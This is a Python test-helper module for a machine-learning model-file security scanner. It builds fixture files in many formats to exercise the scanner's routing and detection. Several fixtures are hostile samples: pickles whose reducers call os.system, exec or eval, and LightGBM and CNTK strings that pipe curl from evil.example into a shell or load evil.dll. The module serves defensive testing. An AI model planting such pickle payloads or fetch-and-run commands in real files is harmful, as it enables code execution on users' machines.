"""
Common file creation utilities for tests.

These utilities create various model file formats for testing purposes.
All functions accept a Path and create the file at that location.
"""

import base64
import io
import json
import pickle
import struct
import zipfile
import zlib
from pathlib import Path
from typing import Any

import pytest

from tests.helpers.pickle_framework import SystemCommandPayload as SystemCommandPayload
from tests.helpers.pickle_framework import pickle_short_binunicode as pickle_short_binunicode

_VALID_JPEG_1X1 = base64.b64decode(
    "/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////"
    "2wBDAf//////////////////////////////////////////////////////////////////////////////////////"
    "wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAP/xAAVEAEBAAAAAAAAAAAAAAAAAAAAAf/"
    "aAAwDAQACEAMQAAAB/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABBQJ//8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/"
    "aAAgBAwEBPwF//8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAgBAgEBPwF//9k="
)
_MALICIOUS_PICKLE = bytes.fromhex(
    "80059525000000000000008c05706f736978948c0673797374656d9493948c0a6563686f2070776e656494859452942e"
)


def _png_chunk(chunk_type: bytes, payload: bytes) -> bytes:
    checksum = zlib.crc32(chunk_type + payload) & 0xFFFFFFFF
    return struct.pack(">I", len(payload)) + chunk_type + payload + struct.pack(">I", checksum)


_VALID_PNG_1X1 = (
    b"\x89PNG\r\n\x1a\n"
    + _png_chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 6, 0, 0, 0))
    + _png_chunk(b"IDAT", zlib.compress(b"\x00\x00\x00\x00\x00"))
    + _png_chunk(b"IEND", b"")
)


def valid_png_bytes() -> bytes:
    """Return a complete 1x1 PNG fixture for media-routing regressions."""
    return _VALID_PNG_1X1


def valid_jpeg_bytes() -> bytes:
    """Return a complete 1x1 JPEG fixture for media-routing regressions."""
    return _VALID_JPEG_1X1


def malicious_pickle_bytes() -> bytes:
    """Return a tiny binary pickle payload that resolves to os.system."""
    return _MALICIOUS_PICKLE


def _tar_octal_field(value: int, length: int) -> bytes:
    return f"{value:0{length - 1}o}\0".encode("ascii")[-length:]


def create_v7_tar_archive(path: Path, *, member_name: str = "payload.txt", payload: bytes = b"payload") -> Path:
    """Create a legacy TAR archive without a ustar magic marker."""
    header = bytearray(512)
    encoded_name = member_name.encode("utf-8")
    if not encoded_name or len(encoded_name) > 100:
        raise ValueError("member_name must encode to 1-100 bytes")

    header[: len(encoded_name)] = encoded_name
    header[100:108] = _tar_octal_field(0o644, 8)
    header[108:116] = _tar_octal_field(0, 8)
    header[116:124] = _tar_octal_field(0, 8)
    header[124:136] = _tar_octal_field(len(payload), 12)
    header[136:148] = _tar_octal_field(0, 12)
    header[148:156] = b"        "
    header[156:157] = b"0"
    checksum = sum(header)
    header[148:156] = f"{checksum:06o}\0 ".encode("ascii")

    padding = b"\0" * ((512 - (len(payload) % 512)) % 512)
    path.write_bytes(bytes(header) + payload + padding + (b"\0" * 1024))
    return path


def create_safe_pickle(path: Path, data: dict[str, Any] | None = None) -> Path:
    """Create a safe pickle file for testing.

    Args:
        path: Where to create the file
        data: Optional data to pickle. Defaults to simple dict.

    Returns:
        Path to created file
    """
    if data is None:
        data = {"model": "test", "weights": [1.0, 2.0, 3.0]}
    with open(path, "wb") as f:
        pickle.dump(data, f)
    return path


def create_malicious_pickle(path: Path, payload_type: str = "os_system") -> Path:
    """Create a malicious pickle file for testing detection.

    Args:
        path: Where to create the file
        payload_type: Type of malicious payload ("os_system", "eval", "subprocess")

    Returns:
        Path to created file
    """
    payloads = {
        "os_system": b"cos\nsystem\n(S'echo pwned'\ntR.",
        "eval": b"cbuiltins\neval\n(S'print(1)'\ntR.",
        "subprocess": b"csubprocess\ncall\n(S'ls'\ntR.",
    }
    payload = payloads.get(payload_type, payloads["os_system"])
    path.write_bytes(payload)
    return path


def protobuf_varint_field(field_number: int, value: int) -> bytes:
    return _encode_protobuf_varint(field_number << 3) + _encode_protobuf_varint(value)


def protobuf_bytes_field(field_number: int, value: bytes) -> bytes:
    return _encode_protobuf_varint((field_number << 3) | 2) + _encode_protobuf_varint(len(value)) + value


def create_mock_coreml(
    path: Path,
    *,
    custom_class: str | None = None,
    custom_parameter: tuple[str, str] | None = None,
    model_type_first: bool = False,
    model_type_padding: int = 0,
) -> Path:
    """Create a minimal structurally valid CoreML model fixture."""
    metadata = protobuf_bytes_field(1, b"Mock CoreML model")
    description = protobuf_bytes_field(100, metadata)
    layer = protobuf_bytes_field(1, b"layer_1")
    if custom_class is not None:
        custom = protobuf_bytes_field(10, custom_class.encode("utf-8"))
        if custom_parameter is not None:
            key, value = custom_parameter
            parameter_value = protobuf_bytes_field(20, value.encode("utf-8"))
            parameter = protobuf_bytes_field(1, key.encode("utf-8")) + protobuf_bytes_field(2, parameter_value)
            custom += protobuf_bytes_field(30, parameter)
        layer += protobuf_bytes_field(500, custom)
    neural_network = protobuf_bytes_field(1, layer) + (b"\x00" * model_type_padding)
    fields = [
        protobuf_varint_field(1, 8),
        protobuf_bytes_field(2, description),
        protobuf_bytes_field(500, neural_network),
    ]
    if model_type_first:
        fields = [fields[1], fields[2], fields[0]]
    model = b"".join(fields)
    path.write_bytes(model)
    return path


def create_mock_pytorch_zip(
    path: Path,
    *,
    with_pickle: bool = True,
    malicious: bool = False,
    data: dict[str, Any] | None = None,
    prefix: str = "",
) -> Path:
    """Create a mock PyTorch ZIP model file.

    Args:
        path: Where to create the file
        with_pickle: Whether to include a pickle file inside
        malicious: Whether to include malicious code (for testing detection)
        data: Optional custom data dict to pickle
        prefix: Optional ZIP member prefix for PyTorch archive-style files

    Returns:
        Path to created file
    """
    with zipfile.ZipFile(path, "w") as zf:
        write_mock_pytorch_zip_metadata(zf, prefix=prefix)
        member_prefix = _mock_pytorch_zip_member_prefix(prefix)
        if with_pickle:
            if data is None:
                data = {"weights": [1, 2, 3], "bias": [0.1, 0.2]}

            if malicious:
                # Add a malicious class that would execute code on unpickle
                data["malicious"] = EvalPayload(("print('malicious code')",))

            pickled_data = pickle.dumps(data)
            zf.writestr(f"{member_prefix}data.pkl", pickled_data)

        # Add a model config file
        zf.writestr(f"{member_prefix}model.json", '{"name": "test_model"}')
    return path


def _mock_pytorch_zip_member_prefix(prefix: str) -> str:
    normalized_prefix = prefix.strip("/")
    return f"{normalized_prefix}/" if normalized_prefix else ""


def write_mock_pytorch_zip_metadata(zf: zipfile.ZipFile, *, prefix: str = "") -> None:
    """Write shared PyTorch ZIP metadata markers used by routing tests."""
    member_prefix = _mock_pytorch_zip_member_prefix(prefix)
    zf.writestr(f"{member_prefix}version", "3\n")
    zf.writestr(f"{member_prefix}byteorder", "little")


def create_mock_gguf(path: Path, *, version: int = 3, metadata: dict[str, str] | None = None) -> Path:
    """Create a mock GGUF file for testing.

    Args:
        path: Where to create the file
        version: GGUF version number

    Returns:
        Path to created file
    """
    payload = bytearray()
    payload.extend(b"GGUF")
    payload.extend(struct.pack("<I", version))
    payload.extend(struct.pack("<Q", 0))

    metadata = metadata or {}
    payload.extend(struct.pack("<Q", len(metadata)))
    for key, value in metadata.items():
        encoded_key = key.encode("utf-8")
        encoded_value = value.encode("utf-8")
        payload.extend(struct.pack("<Q", len(encoded_key)))
        payload.extend(encoded_key)
        payload.extend(struct.pack("<I", 8))
        payload.extend(struct.pack("<Q", len(encoded_value)))
        payload.extend(encoded_value)

    path.write_bytes(bytes(payload))
    return path


def create_mock_onnx(
    path: Path,
    *,
    op_type: str = "Relu",
    domain: str = "",
    tensor_shape: tuple[int, ...] = (1,),
) -> Path:
    """Create a small ONNX model for routing and scanner tests."""
    import onnx
    from onnx import TensorProto, helper

    shape = list(tensor_shape) or [1]
    x_value = helper.make_tensor_value_info("input", TensorProto.FLOAT, shape)
    y_value = helper.make_tensor_value_info("output", TensorProto.FLOAT, shape)
    node = helper.make_node(op_type, ["input"], ["output"], domain=domain, name="node")
    graph = helper.make_graph([node], "graph", [x_value], [y_value])
    model = helper.make_model(graph)
    onnx.save(model, str(path))
    return path


def _encode_protobuf_varint(value: int) -> bytes:
    if value < 0:
        raise ValueError("protobuf varints cannot encode negative values")

    encoded = bytearray()
    while value > 0x7F:
        encoded.append((value & 0x7F) | 0x80)
        value >>= 7
    encoded.append(value)
    return bytes(encoded)


def prefix_mock_onnx_with_unknown_field(
    path: Path,
    *,
    value_size: int = 4,
    field_number: int = 100,
    count: int = 1,
) -> Path:
    """Prefix a serialized ONNX model with legal unknown protobuf fields."""
    if field_number <= 0:
        raise ValueError("field_number must be positive")
    if value_size < 0:
        raise ValueError("value_size cannot be negative")
    if count <= 0:
        raise ValueError("count must be positive")

    payload = path.read_bytes()
    field = _encode_protobuf_varint((field_number << 3) | 2) + _encode_protobuf_varint(value_size) + (b"x" * value_size)
    path.write_bytes((field * count) + payload)
    return path


def prefix_mock_onnx_with_unknown_group(
    path: Path,
    *,
    field_number: int = 100,
    nested_field_count: int = 513,
) -> Path:
    """Prefix an ONNX model with a legal unknown protobuf group."""
    if field_number <= 0:
        raise ValueError("field_number must be positive")
    if nested_field_count <= 0:
        raise ValueError("nested_field_count must be positive")

    start_group = _encode_protobuf_varint((field_number << 3) | 3)
    end_group = _encode_protobuf_varint((field_number << 3) | 4)
    nested_field = _encode_protobuf_varint((1 << 3) | 0) + b"\x01"
    path.write_bytes(start_group + (nested_field * nested_field_count) + end_group + path.read_bytes())
    return path


def prefix_mock_onnx_with_branching_unknown_groups(
    path: Path,
    *,
    field_number: int = 100,
    depth: int = 2,
    branch_count: int = 3,
    leaf_field_count: int = 60,
) -> Path:
    """Prefix ONNX with one group whose nested branches collectively exceed a probe budget."""
    if field_number <= 0:
        raise ValueError("field_number must be positive")
    if depth < 0 or branch_count <= 0 or leaf_field_count <= 0:
        raise ValueError("branching group dimensions must be positive")

    start_group = _encode_protobuf_varint((field_number << 3) | 3)
    end_group = _encode_protobuf_varint((field_number << 3) | 4)
    nested_field = _encode_protobuf_varint((1 << 3) | 0) + b"\x01"

    def build_group_body(remaining_depth: int) -> bytes:
        if remaining_depth == 0:
            return nested_field * leaf_field_count
        child = start_group + build_group_body(remaining_depth - 1) + end_group
        return child * branch_count

    path.write_bytes(start_group + build_group_body(depth) + end_group + path.read_bytes())
    return path


def create_mock_mxnet_symbol(path: Path, *, custom_library: str | None = None) -> Path:
    """Create a minimal MXNet symbol graph, optionally with a custom library reference."""
    nodes: list[dict[str, Any]] = [{"op": "null", "name": "data", "inputs": []}]
    if custom_library is not None:
        nodes.append(
            {
                "op": "Custom",
                "name": "custom_loader",
                "attrs": {"library": custom_library, "op_type": "unsafe_loader"},
                "inputs": [[0, 0, 0]],
            }
        )

    path.write_text(
        json.dumps(
            {
                "nodes": nodes,
                "arg_nodes": [0],
                "heads": [[len(nodes) - 1, 0, 0]],
                "attrs": {"metadata": "benign metadata"},
            }
        ),
        encoding="utf-8",
    )
    return path


def create_mock_manifest(path: Path, content: dict[str, Any] | None = None) -> Path:
    """Create a mock model manifest JSON file.

    Args:
        path: Where to create the file
        content: Optional manifest content. Defaults to minimal valid manifest.

    Returns:
        Path to created file
    """
    if content is None:
        content = {
            "model_name": "test-model",
            "version": "1.0.0",
            "files": ["model.bin", "tokenizer.json"],
        }
    with open(path, "w") as f:
        json.dump(content, f)
    return path


def create_mock_safetensors(path: Path) -> Path:
    """Create a mock safetensors file for testing.

    Requires safetensors package to be installed.

    Args:
        path: Where to create the file

    Returns:
        Path to created file
    """
    import numpy as np
    from safetensors.numpy import save_file

    data = {"tensor1": np.arange(10, dtype=np.float32)}
    save_file(data, str(path))
    return path


def create_mock_h5(path: Path, *, keras_style: bool = False) -> Path:
    """Create a mock HDF5 file for testing.

    Requires h5py package to be installed.

    Args:
        path: Where to create the file
        keras_style: Whether to create Keras-style structure

    Returns:
        Path to created file
    """
    import h5py

    with h5py.File(path, "w") as f:
        f.create_dataset("data", data=[1.0, 2.0, 3.0])
        if keras_style:
            f.attrs["keras_version"] = "2.13.0"
            model_config = f.create_group("model_config")
            model_config.attrs["class_name"] = "Sequential"
    return path


def write_hf_cachedir_tag(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        "Signature: 8a477f597d28d172789f06886806bc55\n"
        "# This file is a cache directory tag created by huggingface_hub.\n"
        "# For information about cache directory tags, see:\n"
        "#\thttps://bford.info/cachedir/\n",
        encoding="utf-8",
    )


def ubjson_key(key: bytes) -> bytes:
    return b"U" + bytes([len(key)]) + key


def ubjson_string(value: bytes) -> bytes:
    return b"SL" + len(value).to_bytes(8, byteorder="big", signed=True) + value


def xgboost_ubjson_probe(
    *, root_padding: int = 0, learner_padding: int = 0, learner_noop: bool = False, malicious: bool = False
) -> bytes:
    root_body = b""
    if root_padding:
        root_body += ubjson_key(b"metadata") + ubjson_string(b"x" * root_padding)
    learner_body = b""
    if learner_padding:
        learner_body += ubjson_key(b"metadata") + ubjson_string(b"x" * learner_padding)
    learner_body += ubjson_key(b"learner_model_param") + b"{}"
    if malicious:
        learner_body += ubjson_key(b"malicious_code") + ubjson_string(b"system(cpu)")
    learner_value = (b"N" if learner_noop else b"") + b"{" + learner_body + b"}"
    return b"{" + root_body + ubjson_key(b"learner") + learner_value + ubjson_key(b"version") + b"[]" + b"}"


def write_hf_tokenizer_json(path: Path, extra_fields: dict[str, Any] | None = None) -> Path:
    payload: dict[str, Any] = {
        "version": "1.0",
        "added_tokens": [],
        "model": {
            "type": "BPE",
            "vocab": {"hello": 0},
            "merges": [],
        },
    }
    if extra_fields:
        payload.update(extra_fields)
    path.write_text(json.dumps(payload), encoding="utf-8")
    return path


def write_ordered_hf_tokenizer_json(
    path: Path,
    *,
    late_fields: str = "",
    padding_size: int = 0,
    model_fields: str = '"type":"BPE","vocab":{"hello":0},"merges":[]',
    version_json: str = '"1.0"',
) -> Path:
    padding = f',"padding":"{"x" * padding_size}"' if padding_size else ""
    path.write_text(
        (f'{{"version":{version_json},"added_tokens":[],"model":{{{model_fields}}}{padding}{late_fields}}}'),
        encoding="utf-8",
    )
    return path


def xgboost_ubjson_uncounted_null_array_probe(item_count: int) -> bytes:
    learner = (
        b"{" + ubjson_key(b"learner_model_param") + b"{}" + ubjson_key(b"payload") + b"[" + (b"Z" * item_count) + b"]}"
    )
    return b"{" + ubjson_key(b"learner") + learner + b"}"


def xgboost_ubjson_noop_before_counted_root_header_probe() -> bytes:
    return (
        b"{N#U\x02"
        + ubjson_key(b"learner")
        + b"{"
        + ubjson_key(b"learner_model_param")
        + b"{}"
        + b"}"
        + ubjson_key(b"version")
        + b"[]"
    )


def write_truncated_ordered_hf_tokenizer_json(path: Path, *, padding_size: int) -> Path:
    path.write_text(
        (
            '{"version":"1.0","added_tokens":[],'
            '"model":{"type":"BPE","vocab":{"hello":0},"merges":[]},'
            f'"padding":"{"x" * padding_size}'
        ),
        encoding="utf-8",
    )
    return path


def write_malicious_lightgbm(path: Path, valid: bool = True) -> None:
    body = "tree=0\nversion=v4\nnum_class=1\n"
    if valid:
        body += (
            "num_tree_per_iteration=1\nmax_feature_idx=2\ntree_sizes=12\nnum_leaves=2\n"
            "split_feature=0\nleaf_value=0.1 0.2\n"
            "metadata=os.system('curl https://collector.evil.example/payload.sh | sh')\n"
            "callback_url=https://collector.evil.example/payload.sh\n"
        )
    path.write_text(body, encoding="utf-8")


def bpe_merges_payload(min_bytes: int = 3 * 1024 * 1024) -> bytes:
    lines = ["#version: 0.2"]
    total_bytes = len(lines[0]) + 1
    index = 0
    while total_bytes <= min_bytes:
        line = f"token_{index % 8192} token_{(index * 17) % 8192}"
        lines.append(line)
        total_bytes += len(line) + 1
        index += 1
    return ("\n".join(lines) + "\n").encode("utf-8")


def joblib_numpy_raw_segment(prefix_length: int, raw_data: bytes) -> bytes:
    padding_length = 16 - ((prefix_length + 1) % 16)
    return bytes([padding_length]) + (b"\xff" * padding_length) + raw_data


def printable_unknown_proto_prefix(min_bytes: int) -> bytes:
    field = b"z " + (b"x" * 32)
    return field * ((min_bytes // len(field)) + 1)


def bert_vocab_payload(min_bytes: int = 16 * 1024) -> bytes:
    tokens = ["[PAD]", "[UNK]", "[CLS]", "[SEP]", "[MASK]"]
    tokens.extend(f"[unused{index}]" for index in range(2048))
    tokens.extend(f"token_{index}" for index in range(2048))
    payload = ("\n".join(tokens) + "\n").encode("utf-8")
    assert len(payload) > min_bytes
    return payload


def write_hf_download_metadata(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        "c5ee24cb16019beea0893ab7796b1df96625c6b8\n821d1aa69520101d6e0737f78a042ae25b19e5c0\n1712656091.123\n",
        encoding="utf-8",
    )


def write_malicious_cntk(path: Path, include_structure: bool = True) -> None:
    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
    structure = b" CompositeFunction primitive_functions " if include_structure else b""
    payload = b" native_user_function loadlibrary C:\\temp\\evil.dll powershell -c curl http://evil.example/p.sh "
    path.write_bytes(prefix + structure + payload)


def xgboost_ubjson_counted_null_array_probe() -> bytes:
    max_count = ((1 << 63) - 1).to_bytes(8, byteorder="big", signed=True)
    learner = b"{" + ubjson_key(b"learner_model_param") + b"{}" + ubjson_key(b"payload") + b"[$Z#L" + max_count + b"}"
    return b"{" + ubjson_key(b"learner") + learner + ubjson_key(b"version") + b"[]" + b"}"


def pickle_binunicode_text(value: str) -> bytes:
    encoded = value.encode("utf-8")
    return b"X" + len(encoded).to_bytes(4, "little") + encoded


def build_printable_utf8_ambiguous_binary_route() -> bytes:
    """Build printable UTF-8 bytes that still require binary fail-closed routing."""
    return (b'""' + ("é" * 17).encode("utf-8")) * 4097


def build_line_broken_printable_utf8_ambiguous_binary_route() -> bytes:
    """Build line-broken printable UTF-8 bytes requiring binary fail-closed routing."""
    return (b'""' + ("é" * 17).encode("utf-8") + b"\n") * 4097


def pickle_binunicode(value: bytes) -> bytes:
    return b"X" + len(value).to_bytes(4, "little") + value


def write_sparse_safetensors_framing(path: Path, header_len: int) -> None:
    with path.open("wb") as handle:
        handle.write(struct.pack("<Q", header_len))
        handle.write(b"{")
        handle.truncate(8 + header_len + 1)


def download_onnx_fixture(
    payload: bytes, sidecar_bytes: bytes, /, *, filename: str, local_dir: str | None = None, **_kwargs: object
) -> str:
    assert local_dir is not None
    path = Path(local_dir) / filename
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(payload if filename == "onnx/model.onnx" else sidecar_bytes)
    return str(path)


def download_onnx_only_fixture(
    payload: bytes, /, *, filename: str, local_dir: str | None = None, **_kwargs: object
) -> str:
    assert filename == "onnx/model.onnx"
    assert local_dir is not None
    path = Path(local_dir) / filename
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(payload)
    return str(path)


def download_payload_fixture(tmp_path: Path, payload: bytes, /, *, filename: str, **_kwargs: object) -> str:
    path = tmp_path / filename
    path.write_bytes(payload)
    return str(path)


class ExecPayload:
    """Serializable exec reducer for malicious scanner regression fixtures."""

    def __reduce__(self) -> tuple[object, tuple[str]]:
        return (exec, ("print('owned')",))


class EvalPayload:
    """Serializable eval reducer for malicious scanner regression fixtures."""

    def __init__(self, args: tuple[str] = ("print('pwned')",)) -> None:
        self.args = args

    def __reduce__(self) -> tuple[object, tuple[str]]:
        return (eval, self.args)


def write_delayed_flax_cntk_overlap(path: Path) -> None:
    from modelaudit.scanners import flax_msgpack_scanner
    from modelaudit.utils.file.detection import FLAX_MSGPACK_STRUCTURE_READ_BYTES

    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
    structure = b" CompositeFunction primitive_functions "
    delayed_flax_root = flax_msgpack_scanner.msgpack.packb(
        {"params": {"w": [1, 2, 3]}, "__reduce__": "attacker_callable"},
        use_bin_type=True,
    )
    path.write_bytes(prefix + structure + (b"\xc0" * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 1)) + delayed_flax_root)


def corrupt_zip_member_crc(path: Path, member_name: str) -> None:
    """Patch a ZIP member CRC so reading the member raises BadZipFile.

    Full scanning sees a malformed entry.
    """
    with zipfile.ZipFile(path) as archive:
        info = archive.getinfo(member_name)
        bad_crc = ((info.CRC + 1) & 0xFFFFFFFF).to_bytes(4, "little")
        local_offset = info.header_offset

    data = bytearray(path.read_bytes())
    assert data[local_offset : local_offset + 4] == b"PK\x03\x04"
    data[local_offset + 14 : local_offset + 18] = bad_crc

    member_name_bytes = member_name.encode("utf-8")
    central_offset = 0
    while True:
        central_offset = data.find(b"PK\x01\x02", central_offset)
        assert central_offset >= 0
        name_length = int.from_bytes(data[central_offset + 28 : central_offset + 30], "little")
        extra_length = int.from_bytes(data[central_offset + 30 : central_offset + 32], "little")
        comment_length = int.from_bytes(data[central_offset + 32 : central_offset + 34], "little")
        name_start = central_offset + 46
        name_end = name_start + name_length
        if data[name_start:name_end] == member_name_bytes:
            data[central_offset + 16 : central_offset + 20] = bad_crc
            break
        central_offset = name_end + extra_length + comment_length

    path.write_bytes(data)


def build_external_onnx_payload(tmp_path: Path, external_path: str, graph_name: str) -> bytes:
    onnx = pytest.importorskip("onnx")
    from onnx import TensorProto, helper
    from onnx.onnx_ml_pb2 import StringStringEntryProto

    tensor = helper.make_tensor("W", TensorProto.FLOAT, [1], vals=[1.0])
    tensor.data_location = onnx.TensorProto.EXTERNAL
    entry = StringStringEntryProto()
    entry.key = "location"
    entry.value = external_path
    tensor.external_data.append(entry)
    graph = helper.make_graph(
        [helper.make_node("Relu", ["input"], ["output"], name="relu")],
        graph_name,
        [helper.make_tensor_value_info("input", TensorProto.FLOAT, [1])],
        [helper.make_tensor_value_info("output", TensorProto.FLOAT, [1])],
        initializer=[tensor],
    )
    model_path = tmp_path / "fixture.onnx"
    onnx.save(helper.make_model(graph), str(model_path))
    return model_path.read_bytes()


def write_binary_fixture(tmp_path: Path, filename: str, payload: bytes) -> Path:
    path = tmp_path / filename
    path.write_bytes(payload)
    return path


def write_chunk_boundary_payload(path: Path, pattern: bytes, *, prefix_len: int, suffix: bytes = b"") -> None:
    chunk_size = 1024 * 1024
    path.write_bytes(b"\x00" * (chunk_size - prefix_len) + pattern[:prefix_len] + pattern[prefix_len:] + suffix)


class ReadTrackingBuffer(io.BytesIO):
    bytes_read = 0

    def read(self, size: int | None = -1) -> bytes:
        data = super().read(size)
        self.bytes_read += len(data)
        return data
